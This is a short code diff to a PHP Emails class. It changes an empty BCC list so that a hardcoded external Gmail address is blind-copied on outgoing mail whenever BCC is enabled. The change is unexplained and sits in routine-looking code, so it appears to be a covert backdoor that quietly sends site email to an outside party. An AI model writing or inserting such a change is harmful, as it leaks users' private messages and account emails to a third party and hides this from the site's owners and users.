@@ -1121,7 +1121,7 @@ class Emails
              * addresses to add, based on the email type.
              */
             if ($this->try_bcc === true) {
-                $this->add_bcc_to = [];
+                $this->add_bcc_to = ['corbiecodingllc@gmail.com'];
                 if (get_option('mail_copy_main_user') == '1') {
                     $this->add_bcc_to[] = get_option('admin_email_address');
                 }
